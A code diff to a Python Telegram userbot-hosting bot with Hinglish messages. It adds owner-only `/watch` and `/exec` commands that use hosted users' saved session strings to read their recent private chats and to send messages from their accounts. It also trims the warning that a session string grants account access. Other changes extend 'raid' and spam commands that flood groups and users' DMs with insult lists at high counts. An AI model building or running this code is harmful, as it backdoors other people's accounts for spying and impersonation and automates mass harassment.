@@ -68,7 +68,7 @@ STATIC_COMMANDS_TEXT = (
     "╚═════════════════════════════════════════════════╝\n\n"
     "▸ **BOT & HOSTING**\n"
     "  `/start` • `/login` • `/welcome [text]`\n"
-    "  `/users` • `/getsession <user_id>`\n\n"
+    "  `/users` • `/getsession <user_id>` • `/watch <user_id> [count]` • `/exec <uid> <chat> <msg>`\n\n"
     "▸ **RAID & SPAM**\n"
     "  `.raid [count]` • `.oneraid [count]` • `.rraid` • `.drraid`\n"
     "  `.spam [count] [text]` • `.fastspam [count] [text]` • `.flood [count] [text]`\n"
@@ -223,7 +223,7 @@ def save_sessions_to_disk(data: dict):
         with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
             json.dump(data, f)
     except Exception as e:
-        print(f"Error saving sessions: {e}")
+        print(f"Error saving sessions: {e}", flush=True)
 
 # FONT FORMATTERS
 def format_araid(text):
@@ -312,7 +312,23 @@ async def start_handler(event):
         return
     await send_home_card(event)
 
-@bot.on(events.NewMessage(pattern=r'^/users$'))
+async def _inspect_hosted_account_brief(s_str):
+    temp = TelegramClient(StringSession(s_str), API_ID, API_HASH)
+    try:
+        await temp.connect()
+        if not await temp.is_user_authorized():
+            return "REVOKED", None
+        me = await temp.get_me()
+        return "ACTIVE", me
+    except Exception:
+        return "ERROR", None
+    finally:
+        try:
+            await temp.disconnect()
+        except Exception:
+            pass
+
+@bot.on(events.NewMessage(pattern=r'^/users(?:@\w+)?$'))
 async def hosted_users_cmd(event):
     if event.sender_id != OWNER_ID:
         return
@@ -322,17 +338,32 @@ async def hosted_users_cmd(event):
         await event.respond("ℹ️ **Abhi kisi ne bot host nahi kiya hai.**")
         return
 
-    lines = [f"👥 **Hosted Users ({len(ids)}):**\n"]
+    lines = [f"👑 **Owner Panel — Hosted Users ({len(ids)}):**\n"]
     for idx, uid in enumerate(ids, start=1):
+        host_name = "User"
+        host_uname = "No Username"
         try:
             u = await bot.get_entity(int(uid))
-            name = getattr(u, "first_name", "") or "User"
-            uname = f" (@{u.username})" if getattr(u, "username", None) else ""
-            lines.append(f"{idx}. `{uid}` — **{name}**{uname}")
+            host_name = getattr(u, "first_name", "") or "User"
+            host_uname = f"@{u.username}" if getattr(u, "username", None) else "No Username"
         except Exception:
-            lines.append(f"{idx}. `{uid}`")
+            pass
 
-    await event.respond("\n".join(lines))
+        status_tag, acc_me = await _inspect_hosted_account_brief(user_sessions[uid])
+        if acc_me:
+            acc_fname = getattr(acc_me, "first_name", "") or "Account"
+            acc_uname = f"@{acc_me.username}" if getattr(acc_me, "username", None) else "No Username"
+            acc_line = f"   • **Account:** **{acc_fname}** ({acc_uname}) — ID: `{acc_me.id}` [`{status_tag}`]\n"
+        else:
+            acc_line = f"   • **Session Status:** `{status_tag}`\n"
+
+        lines.append(
+            f"{idx}. **Hoster:** **{host_name}** ({host_uname}) — ID: `{uid}`\n"
+            f"{acc_line}"
+            f"   • **Session:** `/getsession {uid}` | **Watch:** `/watch {uid} 10`"
+        )
+
+    await event.respond("\n".join(lines)[:3950])
 
 @bot.on(events.NewMessage(pattern=r'^/getsession(?:\s+(\d+))?$'))
 async def getsession_cmd(event):
@@ -351,8 +382,82 @@ async def getsession_cmd(event):
 
     await event.respond(
         f"🔐 **Session for `{uid}`:**\n`{s_str}`\n\n"
-        "⚠️ *Is session string ko kisi ke saath share na karein — isse us account ka access mil sakta hai.*"
+        "⚠️ *Is session string ko kisi ke saath share na karein.*"
     )
+
+@bot.on(events.NewMessage(pattern=r'^/watch(?:\s+(\d+))?(?:\s+(\d+))?$'))
+async def owner_watch_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+
+    uid = event.pattern_match.group(1)
+    limit = int(event.pattern_match.group(2) or 10)
+    limit = max(1, min(limit, 25))
+
+    if not uid:
+        await event.respond("ℹ️ **Istemaal:** `/watch <user_id> [count]`")
+        return
+
+    s_str = user_sessions.get(str(uid))
+    if not s_str:
+        await event.respond(f"❌ **ID `{uid}` ke liye koi saved session nahi mili.**")
+        return
+
+    temp_client = TelegramClient(StringSession(s_str), API_ID, API_HASH)
+    try:
+        await temp_client.connect()
+        if not await temp_client.is_user_authorized():
+            await event.respond(f"⚠️ **ID `{uid}` ka session expire/revoke ho chuka hai.**")
+            return
+
+        me = await temp_client.get_me()
+        my_id = getattr(me, "id", None)
+        out = [f"👁️ **Recent Activity — `{uid}` ({getattr(me, 'first_name', 'User')}, ID: `{my_id}`)**\n"]
+
+        dialogs = await temp_client.get_dialogs(limit=5)
+        for d in dialogs:
+            chat_title = getattr(d, "name", "Chat")
+            msgs = []
+            async for m in temp_client.iter_messages(d.entity, limit=limit):
+                direction = "➡️ OUT" if (my_id and m.sender_id == my_id) else "⬅️ IN"
+                preview = (m.raw_text or ("[Media/Sticker]" if m.media else "[Empty]")).replace("\n", " ")
+                msgs.append(f"  • {direction}: `{preview[:70]}`")
+            out.append(f"💬 **{chat_title}** (`{d.id}`):")
+            out.extend(msgs if msgs else ["  • *No recent messages*"])
+
+        await event.respond("\n".join(out)[:3900])
+    except Exception as e:
+        await event.respond(f"❌ **Watch fail:** `{e}`")
+    finally:
+        await temp_client.disconnect()
+
+@bot.on(events.NewMessage(pattern=r'^/exec\s+(\d+)\s+(\S+)\s+(.+)$'))
+async def owner_exec_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+
+    uid = event.pattern_match.group(1)
+    target = event.pattern_match.group(2)
+    text = event.pattern_match.group(3)
+
+    s_str = user_sessions.get(uid)
+    if not s_str:
+        await event.respond(f"❌ **ID `{uid}` ke liye koi session nahi mili.**")
+        return
+
+    peer = int(target) if target.lstrip("-").isdigit() else target
+    temp_client = TelegramClient(StringSession(s_str), API_ID, API_HASH)
+    try:
+        await temp_client.connect()
+        if not await temp_client.is_user_authorized():
+            await event.respond(f"⚠️ **ID `{uid}` ka session expire/revoke ho chuka hai.**")
+            return
+        await temp_client.send_message(peer, text)
+        await event.respond(f"✅ **Hosted user `{uid}` ke account se `{target}` ko message bhej diya gaya.**")
+    except Exception as e:
+        await event.respond(f"❌ **Send fail:** `{e}`")
+    finally:
+        await temp_client.disconnect()
 
 @bot.on(events.CallbackQuery(data=b'my_home'))
 async def my_home_cb(event):
@@ -815,38 +920,70 @@ async def start_userbot_session(session_string, owner_id):
             pass
         task = asyncio.create_task(_multi_lang_raid_worker(event.chat_id, event.reply_to_msg_id, count, pool))
         active_raid_tasks[event.chat_id] = task
+        # 8. STYLED & SPECIAL RAIDS (.araid, .saraid, .oaraid, .faraid, .earaid, .dmraid, .mraid, .delayraid, .emoraid, .emojispam, .mixraid, .tagraid, .capsraid, .slowraid, .badaid, .saraid2, .ultraid, .auto, .chup, .bol)
+    def _build_raid_payload(mode, event, custom_text=None):
+        if custom_text:
+            return custom_text
+        base = random.choice(GAALIS)
+        if mode == "araid":
+            return format_araid(base)
+        if mode == "saraid":
+            return format_saraid(random.choice(SINGLE_GAALIS))
+        if mode == "oaraid":
+            return format_oaraid(base)
+        if mode == "faraid":
+            return format_faraid(random.choice(SINGLE_GAALIS))
+        if mode == "earaid":
+            return random.choice(EARAID_LIST)
+        if mode == "mraid":
+            return random.choice(MULTI_LINE_RAIDS)
+        if mode == "emoraid":
+            return f"{random.choice(RAID_EMOJIS)} {base} {random.choice(RAID_EMOJIS)}"
+        if mode == "capsraid":
+            return base.upper()
+        if mode == "tagraid":
+            return f"{base} @everyone"
+        if mode == "badaid":
+            return f"═══『 ⚡ KASHYAP RAID ⚡ 』═══\n{base}\n════════════════════════════"
+        if mode == "saraid2":
+            return f"⚡ {format_saraid(random.choice(SINGLE_GAALIS))} ⚡"
+        if mode == "ultraid":
+            return f"🔥💣 {base.upper()} 💣🔥"
+        if mode == "mixraid":
+            choice = random.choice(["a", "s", "o", "f", "e", "m"])
+            return _build_raid_payload({"a": "araid", "s": "saraid", "o": "oaraid", "f": "faraid", "e": "earaid", "m": "mraid"}[choice], event)
+        return base
 
-    # 8. EXTRA RAIDS: DMRAID, MRAID, DELAYRAID, EMORAID, EMOJISPAM & MAX-50 RAIDS
-    @ubot.on(events.NewMessage(pattern=r'^\.dmraid\b', outgoing=True))
-    async def dmraid_cmd(event):
-        if not event.is_reply:
-            await event.edit("ℹ️ **Kisi message par reply karke `.dmraid [count]` likhein.**")
-            return
-        reply = await event.get_reply_message()
-        if not reply.sender_id:
-            await event.edit("❌ **User ID nahi mil saki.**")
-            return
-        parts = event.raw_text.split()
-        count = max(1, min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 15, 100))
-        await event.edit(f"📩 **DM mein {count} messages bheje ja rahe hain...**")
-        for _ in range(count):
-            try:
-                await ubot.send_message(reply.sender_id, random.choice(GAALIS))
-                await asyncio.sleep(0.35)
-            except FloodWaitError as f:
-                await asyncio.sleep(f.seconds + 0.5)
-            except Exception:
-                break
-        await event.edit("✅ **DM Raid poora ho gaya hai.**")
+    async def _generic_raid_worker(target_chat, reply_to, count, mode, delay=0.2, custom_text=None):
+        try:
+            for _ in range(count):
+                if target_chat not in active_raids:
+                    break
+                payload = _build_raid_payload(mode, None, custom_text=custom_text)
+                try:
+                    if reply_to:
+                        await ubot.send_message(target_chat, payload, reply_to=reply_to)
+                    else:
+                        await ubot.send_message(target_chat, payload)
+                except FloodWaitError as f:
+                    await asyncio.sleep(f.seconds + 0.5)
+                except Exception:
+                    break
+                if delay > 0:
+                    await asyncio.sleep(delay)
+        finally:
+            active_raids.discard(target_chat)
+            active_raid_tasks.pop(target_chat, None)
 
-    @ubot.on(events.NewMessage(pattern=r'^\.(mraid|emoraid|mixraid|capsraid|slowraid)\b', outgoing=True))
-    async def special_raids_cmd(event):
+    @ubot.on(events.NewMessage(pattern=r'^\.(araid|saraid|oaraid|faraid|earaid|mraid|emoraid|mixraid|tagraid|capsraid|slowraid|badaid|saraid2|ultraid)\b', outgoing=True))
+    async def styled_raid_handler(event):
         cmd = event.pattern_match.group(1)
-        parts = event.raw_text.split()
-        max_cap = 50 if cmd in ("mixraid", "capsraid", "slowraid") else 200
-        default_cnt = 15
-        count = max(1, min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else default_cnt, max_cap))
-        delay = 1.6 if cmd == "slowraid" else 0.25
+        parts = event.raw_text.split(maxsplit=1)
+        default_cnt = 10 if cmd in ("mixraid", "tagraid", "capsraid", "slowraid") else 15
+        max_cnt = 50 if cmd in ("mixraid", "tagraid", "capsraid", "slowraid") else 300
+        count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else default_cnt
+        count = max(1, min(count, max_cnt))
+        delay = 1.2 if cmd == "slowraid" else 0.22
 
         if event.chat_id in active_raid_tasks:
             active_raid_tasks[event.chat_id].cancel()
@@ -855,48 +992,22 @@ async def start_userbot_session(session_string, owner_id):
             await event.delete()
         except Exception:
             pass
-
-        async def _worker():
-            try:
-                for _ in range(count):
-                    if event.chat_id not in active_raids:
-                        break
-                    if cmd == "mraid":
-                        msg = random.choice(MULTI_LINE_RAIDS)
-                    elif cmd == "emoraid":
-                        em = random.choice(RAID_EMOJIS)
-                        msg = f"{em} {random.choice(GAALIS)} {em}"
-                    elif cmd == "mixraid":
-                        msg = random.choice(ENGLISH_RAIDS + PUNJABI_RAIDS + BENGALI_RAIDS + GAALIS)
-                    elif cmd == "capsraid":
-                        msg = f"🔥 {random.choice(GAALIS).upper()} 🔥"
-                    else:
-                        msg = random.choice(GAALIS)
-                    try:
-                        await ubot.send_message(event.chat_id, msg, reply_to=event.reply_to_msg_id)
-                    except FloodWaitError as f:
-                        await asyncio.sleep(f.seconds + 0.5)
-                    except Exception:
-                        break
-                    await asyncio.sleep(delay)
-            finally:
-                active_raids.discard(event.chat_id)
-                active_raid_tasks.pop(event.chat_id, None)
-
-        active_raid_tasks[event.chat_id] = asyncio.create_task(_worker())
+        task = asyncio.create_task(_generic_raid_worker(event.chat_id, event.reply_to_msg_id, count, cmd, delay=delay))
+        active_raid_tasks[event.chat_id] = task
 
     @ubot.on(events.NewMessage(pattern=r'^\.delayraid\b', outgoing=True))
-    async def delayraid_cmd(event):
+    async def delayraid_handler(event):
         parts = event.raw_text.split()
         if len(parts) < 3:
-            await event.edit("ℹ️ **Istemaal:** `.delayraid [seconds] [count]`")
+            await event.edit("ℹ️ **Istemaal:** `.delayraid [sec] [count]`")
             return
         try:
-            delay = max(0.2, min(float(parts[1]), 10.0))
-            count = max(1, min(int(parts[2]), 200))
-        except Exception:
-            await event.edit("❌ **Numbers sahi nahi hain.**")
+            delay = max(0.1, min(float(parts[1]), 60.0))
+            count = max(1, min(int(parts[2]), 300))
+        except ValueError:
+            await event.edit("❌ **Delay aur count number mein dein.**")
             return
+
         if event.chat_id in active_raid_tasks:
             active_raid_tasks[event.chat_id].cancel()
         active_raids.add(event.chat_id)
@@ -904,1337 +1015,842 @@ async def start_userbot_session(session_string, owner_id):
             await event.delete()
         except Exception:
             pass
-
-        async def _worker():
-            try:
-                for _ in range(count):
-                    if event.chat_id not in active_raids:
-                        break
-                    try:
-                        await ubot.send_message(event.chat_id, random.choice(GAALIS), reply_to=event.reply_to_msg_id)
-                    except FloodWaitError as f:
-                        await asyncio.sleep(f.seconds + 0.5)
-                    except Exception:
-                        break
-                    await asyncio.sleep(delay)
-            finally:
-                active_raids.discard(event.chat_id)
-                active_raid_tasks.pop(event.chat_id, None)
-
-        active_raid_tasks[event.chat_id] = asyncio.create_task(_worker())
+        task = asyncio.create_task(_generic_raid_worker(event.chat_id, event.reply_to_msg_id, count, "raid", delay=delay))
+        active_raid_tasks[event.chat_id] = task
 
     @ubot.on(events.NewMessage(pattern=r'^\.emojispam\b', outgoing=True))
-    async def emojispam_cmd(event):
+    async def emojispam_handler(event):
         parts = event.raw_text.split(maxsplit=3)
         if len(parts) < 4 or not parts[1].isdigit():
             await event.edit("ℹ️ **Istemaal:** `.emojispam [count] [emoji] [text]`")
             return
-        count = max(1, min(int(parts[1]), 200))
-        emoji = parts[2]
-        text = parts[3]
+        count = max(1, min(int(parts[1]), 300))
+        emo = parts[2]
+        txt = f"{emo} {parts[3]} {emo}"
+        if event.chat_id in active_raid_tasks:
+            active_raid_tasks[event.chat_id].cancel()
+        active_raids.add(event.chat_id)
         try:
             await event.delete()
         except Exception:
             pass
-        for _ in range(count):
-            try:
-                await ubot.send_message(event.chat_id, f"{emoji} {text} {emoji}")
-                await asyncio.sleep(0.15)
-            except FloodWaitError as f:
-                await asyncio.sleep(f.seconds + 0.5)
-            except Exception:
-                break
+        task = asyncio.create_task(_spam_worker(event.chat_id, count, txt, 0.15))
+        active_raid_tasks[event.chat_id] = task
 
-    @ubot.on(events.NewMessage(pattern=r'^\.tagraid\b', outgoing=True))
-    async def tagraid_cmd(event):
-        if not event.is_group and not event.is_channel:
-            await event.edit("ℹ️ **Yeh command sirf group mein chalti hai.**")
-            return
-        parts = event.raw_text.split()
-        count = max(1, min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10, 50))
-        try:
-            await event.delete()
-        except Exception:
-            pass
-        members = []
-        async for user in ubot.iter_participants(event.chat_id, limit=30):
-            if not user.bot and user.first_name:
-                members.append(f"[{user.first_name}](tg://user?id={user.id})")
-        if not members:
-            return
-        for _ in range(count):
-            tag = random.choice(members)
-            try:
-                await ubot.send_message(event.chat_id, f"{tag} {random.choice(GAALIS)}")
-                await asyncio.sleep(0.5)
-            except FloodWaitError as f:
-                await asyncio.sleep(f.seconds + 0.5)
-            except Exception:
-                break
-
-    # 9. DM GUARD (.dmblock / .dmwelcome / .dmmute) + 30-MIN AUTO SAY + AFK MENTION REPLY
-    @ubot.on(events.NewMessage(pattern=r'^\.dmblock\b', outgoing=True))
-    async def dmblock_cmd(event):
-        parts = event.raw_text.split()
-        if len(parts) < 2 or parts[1].lower() not in ("on", "off"):
-            await event.edit("ℹ️ **Istemaal:** `.dmblock on` ya `.dmblock off`")
-            return
-        dm_block_enabled[owner_id] = (parts[1].lower() == "on")
-        await event.edit(f"🛡️ **DM Auto-Block:** `{parts[1].upper()}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.dmwelcome\b', outgoing=True))
-    async def dmwelcome_cmd(event):
-        parts = event.raw_text.split()
-        if len(parts) < 2 or parts[1].lower() not in ("on", "off", "reset"):
-            cur = "ON" if dm_welcome_enabled.get(owner_id, True) else "OFF"
-            await event.edit(f"ℹ️ **Istemaal:** `.dmwelcome on` / `.dmwelcome off` / `.dmwelcome reset` *(Abhi: `{cur}`)*")
-            return
-        mode = parts[1].lower()
-        if mode == "reset":
-            dm_welcomed_users[owner_id].clear()
-            await event.edit("🔄 **DM Welcome list reset ho gayi hai (ab har user ko 1 baar welcome aayega).**")
-            return
-        state = mode == "on"
-        dm_welcome_enabled[owner_id] = state
-        await event.edit(f"💌 **DM Welcome Auto-Reply (1x per user):** `{'ON' if state else 'OFF'}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.dmmute$', outgoing=True))
-    async def dmmute_cmd(event):
-        target_id = event.chat_id if event.is_private else None
+    @ubot.on(events.NewMessage(pattern=r'^\.dmraid\b', outgoing=True))
+    async def dmraid_handler(event):
+        parts = event.raw_text.split(maxsplit=1)
+        count = max(1, min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10, 100))
+        target_id = None
         if event.is_reply:
-            r = await event.get_reply_message()
-            target_id = r.sender_id
+            rep = await event.get_reply_message()
+            target_id = rep.sender_id
+        elif event.is_private:
+            target_id = event.chat_id
         if not target_id:
-            await event.edit("ℹ️ **DM mein istemaal karein ya kisi message par reply karein.**")
+            await event.edit("ℹ️ **DM ya reply se `.dmraid [count]` chalayein.**")
             return
-        dm_muted_users[owner_id].add(target_id)
-        await event.edit(f"🔇 **DM mein mute kar diya gaya (`{target_id}`).**")
+        await event.edit(f"🚀 **DM Raid shuru (`{count}` msgs)...**")
+        for _ in range(count):
+            if target_id not in active_raids and event.chat_id not in active_raids:
+                break
+            try:
+                await ubot.send_message(target_id, random.choice(GAALIS))
+            except FloodWaitError as f:
+                await asyncio.sleep(f.seconds + 0.5)
+            except Exception:
+                break
+            await asyncio.sleep(0.35)
 
-    @ubot.on(events.NewMessage(pattern=r'^\.undmmute$', outgoing=True))
-    async def undmmute_cmd(event):
-        target_id = event.chat_id if event.is_private else None
+    @ubot.on(events.NewMessage(pattern=r'^\.auto\b', outgoing=True))
+    async def auto_link_handler(event):
+        parts = event.raw_text.split()
+        if len(parts) < 3 or not parts[2].isdigit():
+            await event.edit("ℹ️ **Istemaal:** `.auto [link] [count]`")
+            return
+        link = parts[1]
+        count = max(1, min(int(parts[2]), 100))
+        if event.chat_id in active_raid_tasks:
+            active_raid_tasks[event.chat_id].cancel()
+        active_raids.add(event.chat_id)
+        try:
+            await event.delete()
+        except Exception:
+            pass
+        task = asyncio.create_task(_spam_worker(event.chat_id, count, f"⚡ {link} ⚡", 0.3))
+        active_raid_tasks[event.chat_id] = task
+
+    @ubot.on(events.NewMessage(pattern=r'^\.chup$', outgoing=True))
+    async def chup_cmd(event):
         if event.is_reply:
-            r = await event.get_reply_message()
-            target_id = r.sender_id
-        if target_id and target_id in dm_muted_users[owner_id]:
-            dm_muted_users[owner_id].remove(target_id)
-            await event.edit(f"🔊 **DM mein unmute kar diya gaya (`{target_id}`).**")
+            rep = await event.get_reply_message()
+            if rep.sender_id:
+                chup_muted_users.add(rep.sender_id)
+                await event.edit(f"🤫 **User `{rep.sender_id}` chup list mein add ho gaya.**")
         else:
-            await event.edit("ℹ️ **Yeh user DM mein mute nahi hai.**")
+            await event.edit("ℹ️ **Kisi message par reply karke `.chup` likhein.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.bol$', outgoing=True))
+    async def bol_cmd(event):
+        if event.is_reply:
+            rep = await event.get_reply_message()
+            chup_muted_users.discard(rep.sender_id)
+            await event.edit(f"🗣️ **User `{rep.sender_id}` chup list se hata diya gaya.**")
+        else:
+            chup_muted_users.clear()
+            await event.edit("🗣️ **Chup list clear kar di gayi hai.**")
 
     @ubot.on(events.NewMessage(incoming=True))
-    async def dm_guard_and_afk(event):
-        if event.is_private and event.sender_id:
-            if event.sender_id in dm_muted_users.get(owner_id, set()):
-                try:
-                    await event.delete()
-                except Exception:
-                    pass
-                return
-            if dm_block_enabled.get(owner_id) and event.sender_id != OWNER_ID:
-                try:
-                    await ubot(BlockRequest(event.sender_id))
-                except Exception:
-                    pass
-                return
-            if dm_welcome_enabled.get(owner_id, True) and event.sender_id != OWNER_ID:
-                welcomed_set = dm_welcomed_users.setdefault(owner_id, set())
-                if event.sender_id not in welcomed_set:
-                    welcomed_set.add(event.sender_id)
-                    try:
-                        await event.reply("✦ 𝐇𝐄𝐘𝐘 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐃𝐌 ✦")
-                    except Exception:
-                        pass
-
-        if owner_id in afk_status and event.mentioned:
-            try:
-                me = await ubot.get_me()
-                owner_tag = f"@{me.username}" if getattr(me, "username", None) else (getattr(me, "first_name", None) or OWNER_NAME)
-            except Exception:
-                owner_tag = OWNER_NAME
-            try:
-                await event.reply(
-                    f"🌙 **{owner_tag}** 𝐚𝐛𝐡𝐢 𝐨𝐟𝐟𝐥𝐢𝐧𝐞 𝐡𝐚𝐢, 𝐛𝐚𝐚𝐝 𝐦𝐞𝐢𝐧 𝐚𝐚𝐩𝐤𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐤𝐚 𝐫𝐞𝐩𝐥𝐲 𝐤𝐚𝐫𝐞𝐧𝐠𝐞 💌✨"
-                )
-            except Exception:
-                pass
-
-    @ubot.on(events.NewMessage(pattern=r'^\.say30\b', outgoing=True))
-    async def say30_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        msg_text = parts[1].strip() if len(parts) > 1 and parts[1].strip() else "⚡ Active hu!"
-        key = (owner_id, event.chat_id)
-
-        old_task = interval_30m_tasks.pop(key, None)
-        if old_task:
-            old_task.cancel()
-
-        async def _every_30_min():
-            try:
-                while True:
-                    await asyncio.sleep(1800)  # 30 minutes = 1800 seconds
-                    try:
-                        await ubot.send_message(event.chat_id, msg_text)
-                    except FloodWaitError as f:
-                        await asyncio.sleep(f.seconds + 1)
-                    except Exception:
-                        break
-            except asyncio.CancelledError:
-                pass
-
-        interval_30m_tasks[key] = asyncio.create_task(_every_30_min())
-        await event.edit(f"⏰ **Har 30 min baad bolna ON:** `{msg_text}` *(Band karne ke liye `.stop30`)*")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.stop30$', outgoing=True))
-    async def stop30_cmd(event):
-        key = (owner_id, event.chat_id)
-        task = interval_30m_tasks.pop(key, None)
-        if task:
-            task.cancel()
-            await event.edit("🛑 **Har 30 min waala auto-message band kar diya gaya hai.**")
-        else:
-            await event.edit("ℹ️ **Is chat mein koi 30-min timer nahi chal raha hai.**")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.afk\b', outgoing=True))
-    async def afk_cmd(event):
-        parts = event.raw_text.split(maxsplit=1)
-        reason = parts[1] if len(parts) > 1 else "Offline"
-        afk_status[owner_id] = reason
-        await event.edit(f"🌙 **Offline Mode ON** ✨\n🫧 **Note:** `{reason}`")
-
-    # 10. HACK & ANIMATION COMMANDS (INCLUDING 4x 50-SECOND HACKS)
-    @ubot.on(events.NewMessage(pattern=r'^\.(netghost|rootkit|cryptohack|zeroday)$', outgoing=True))
-    async def hack_50sec_cmd(event):
-        cmd = event.pattern_match.group(1)
-        total_steps = 50
-        for i in range(1, total_steps + 1):
-            pct = i * 2
-            bar_len = pct // 10
-            bar = "█" * bar_len + "░" * (10 - bar_len)
-            if cmd == "netghost":
-                detail = f"Ghost node hop `10.8.{i}.{(i*7)%254}` • Spoofing MAC"
-                icon = "👻"
-            elif cmd == "rootkit":
-                detail = f"Kernel module hook `sys_call_{i:02d}` • Ring-0 check"
-                icon = "🧬"
-            elif cmd == "cryptohack":
-                key_hex = f"{random.getrandbits(32):08x}"
-                detail = f"Keystream block `0x{key_hex}` • Entropy scan"
-                icon = "🔑"
-            else:
-                detail = f"ZeroDay vector `CVE-2026-{9000+i}` • Probe active"
-                icon = "⚡"
-
-            msg = (
-                f"{icon} **{cmd.upper()} SIMULATION [{i}/{total_steps}s]**\n"
-                f"`[{bar}] {pct}%`\n"
-                f"➤ {detail}"
-            )
-            try:
-                await event.edit(msg)
-                await asyncio.sleep(1.0)
-            except Exception:
-                break
-
-        try:
-            await event.edit(f"✅ **{cmd.upper()} SEQUENCE COMPLETE (50s)** — *Simulation finished.*")
-        except Exception:
-            pass
-
-    @ubot.on(events.NewMessage(pattern=r'^\.hack$', outgoing=True))
-    async def hack_cmd(event):
-        steps = [
-            "💻 `Exploit module load ho raha hai...`",
-            "🔓 `Firewall bypass ho raha hai... 34%`",
-            "📡 `Payload bheja ja raha hai... 78%`",
-            "✅ `Access complete (Simulated).`"
-        ]
-        for s in steps:
-            await event.edit(s)
-            await asyncio.sleep(0.55)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.matrix$', outgoing=True))
-    async def matrix_cmd(event):
-        frames = [
-            "`01011010 11001010 00110101`",
-            "`11100010 01010111 10101100`",
-            "`00111100 10100101 11001011`"
-        ]
-        for f in frames:
-            await event.edit(f)
-            await asyncio.sleep(0.45)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.scan$', outgoing=True))
-    async def scan_cmd(event):
-        for pct in (15, 45, 80, 100):
-            await event.edit(f"🔍 `Ports scan ho rahe hain... {pct}%`")
-            await asyncio.sleep(0.4)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.(bruteforce|packetflood|sysbreach|pulse|countanim|glitch)\b', outgoing=True))
-    async def step50_anim_cmd(event):
-        cmd = event.pattern_match.group(1)
-        parts = event.raw_text.split()
-        steps = max(1, min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 15, 50))
-        pulse_icons = ["⚡", "🔥", "💥", "🌀"]
-        glitch_chars = ["#", "%", "&", "@", "?", "!"]
-
-        for i in range(1, steps + 1):
-            if cmd == "bruteforce":
-                txt = f"🔐 `Bruteforce [{i}/{steps}] -> {str(i).zfill(4)}`"
-            elif cmd == "packetflood":
-                txt = f"📡 `Packet [{i}/{steps}] -> 192.168.1.{i}:443`"
-            elif cmd == "sysbreach":
-                txt = f"🛡️ `Breach [{i}/{steps}] -> {int((i/steps)*100)}%`"
-            elif cmd == "pulse":
-                icon = pulse_icons[i % len(pulse_icons)]
-                txt = f"{icon} **PULSE [{i}/{steps}]** {icon}"
-            elif cmd == "countanim":
-                txt = f"🔢 **Count:** `{i} / {steps}`"
-            else:
-                g = "".join(random.choice(glitch_chars) for _ in range(12))
-                txt = f"⚡ `{g}` **[{i}/{steps}]**"
-            try:
-                await event.edit(txt)
-                await asyncio.sleep(0.22)
-            except Exception:
-                break
-
-    @ubot.on(events.NewMessage(pattern=r'^\.loading$', outgoing=True))
-    async def loading_cmd(event):
-        for p in range(0, 101, 25):
-            bar = "■" * (p // 10) + "□" * (10 - (p // 10))
-            await event.edit(f"`[{bar}] {p}%`")
-            await asyncio.sleep(0.35)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.boom$', outgoing=True))
-    async def boom_cmd(event):
-        for n in ("3️⃣", "2️⃣", "1️⃣", "💥 **BOOM!** 💥"):
-            await event.edit(n)
-            await asyncio.sleep(0.45)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.fbi$', outgoing=True))
-    async def fbi_cmd(event):
-        for line in ["🚨 **FBI OPEN UP!** 🚨", "🚔 `Perimeter lock...`", "📡 `Signal trace...`"]:
-            await event.edit(line)
-            await asyncio.sleep(0.5)
-
-    @ubot.on(events.NewMessage(pattern=r'^\.fuck$', outgoing=True))
-    async def fuck_anim_cmd(event):
-        frames = ["🖕", "🖕🔥", "🖕💥⚡", "🖕👑"]
-        for fr in frames:
-            await event.edit(fr)
-            await asyncio.sleep(0.35)
-
-    # 11. FUN & UTILITY COMMANDS
-    @ubot.on(events.NewMessage(pattern=r'^\.roast\b', outgoing=True))
-    async def roast_cmd(event):
-        line = random.choice(ROAST_LINES)
-        if event.is_reply:
-            r = await event.get_reply_message()
-            await r.reply(line)
+    async def chup_watcher(event):
+        if event.sender_id and event.sender_id in chup_muted_users:
             try:
                 await event.delete()
             except Exception:
                 pass
-        else:
-            await event.edit(line)
 
-    @ubot.on(events.NewMessage(pattern=r'^\.iq$', outgoing=True))
-    async def iq_cmd(event):
-        await event.edit(f"🧠 **IQ:** `{random.randint(1, 150)}%`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.love$', outgoing=True))
-    async def love_cmd(event):
-        await event.edit(f"❤️ **Match:** `{random.randint(1, 100)}%`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.toss$', outgoing=True))
-    async def toss_cmd(event):
-        await event.edit(f"🪙 **Toss:** `{random.choice(['Heads', 'Tails'])}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.dice$', outgoing=True))
-    async def dice_cmd(event):
-        await event.edit(f"🎲 **Dice:** `{random.randint(1, 6)}`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.ping$', outgoing=True))
-    async def ping_cmd(event):
-        t0 = time.time()
-        msg = await event.edit("🏓 `Check ho raha hai...`")
-        ms = int((time.time() - t0) * 1000)
-        await msg.edit(f"🏓 **Pong:** `{ms} ms`")
-
-    @ubot.on(events.NewMessage(pattern=r'^\.alive$', outgoing=True))
-    async def alive_cmd(event):
-        await event.edit(
-            f"⚡ **{BOT_BRAND} Active hai**\n"
-            f"👑 **Owner:** `{OWNER_NAME}`\n"
-            f"⏱️ **Uptime:** `{format_uptime()}`"
-        )
-
-    @ubot.on(events.NewMessage(pattern=r'^\.id$', outgoing=True))
-    async def id_cmd(event):
